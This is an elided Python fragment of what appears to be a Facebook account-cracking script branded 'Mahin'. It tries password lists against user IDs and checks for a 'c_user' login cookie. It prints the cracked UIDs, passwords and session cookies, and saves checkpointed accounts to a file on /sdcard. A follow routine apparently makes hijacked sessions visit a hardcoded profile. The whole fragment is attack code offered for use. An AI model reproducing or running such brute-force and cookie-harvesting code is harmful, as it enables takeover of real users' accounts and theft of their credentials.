...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100000545457649', {
...
os.system('xdg-open https://www.facebook.com/100000545457649')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[Mahin-OK💉] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎❤]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                print('\r\r\33[1;30m[Mahin-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/Mahin-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\r%s{x}[{xr}Mahin{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
